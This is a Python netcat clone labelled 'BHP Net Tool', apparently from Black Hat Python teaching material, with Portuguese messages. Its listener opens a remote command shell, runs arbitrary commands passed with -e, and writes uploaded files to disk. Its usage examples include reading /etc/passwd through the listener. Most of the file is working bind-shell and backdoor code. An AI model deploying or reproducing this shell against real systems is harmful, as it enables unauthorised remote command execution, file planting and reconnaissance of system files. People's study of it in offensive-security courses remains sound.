import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return ''
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                response = ''
                while True:
                    data = self.socket.recv(4096)
                    if not data:
                        break
                    response += data.decode()
                if response:
                    print(response)
                    buffer = input('>')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('Interrompido pelo Usuário.')
        finally:
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f'Escutando na {self.args.target}:{self.args.port}')

        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        try:
            if self.args.execute:
                output = execute(self.args.execute)
                client_socket.send(output.encode())
            elif self.args.upload:
                file_buffer = b''
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    file_buffer += data
                with open(self.args.upload, 'wb') as f:
                    f.write(file_buffer)
                message = f'Arquivo salvo {self.args.upload}'
                client_socket.send(message.encode())
            elif self.args.command:
                while True:
                    client_socket.send(b'BHP: #>')
                    cmd_buffer = b''
                    while b'\n' not in cmd_buffer:
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
        except Exception as e:
            print(f'Servidor encerrado: {e}')
        finally:
            client_socket.close()

def main():
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Exemplo:
        netcat.py -t 192.168.1.108 -p 5555 -l -c
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt
        netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" 
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
        
        netcat.py -t 192.168.1.108 -p 5555
                               '''))
    parser.add_argument('-c', '--command', action='store_true', help='Shell de comando')
    parser.add_argument('-e', '--execute', help='Executar comando especificado')
    parser.add_argument('-l', '--listen', action='store_true', help='Ouvir')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Porta especificada')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='IP especificado')
    parser.add_argument('-u', '--upload', help='Fazer upload de arquivo')
    args = parser.parse_args()

    if args.listen:
        buffer = b''
    else:
        buffer = sys.stdin.read().encode()

    nc = NetCat(args, buffer)
    nc.run()

if __name__ == '__main__':
    main()
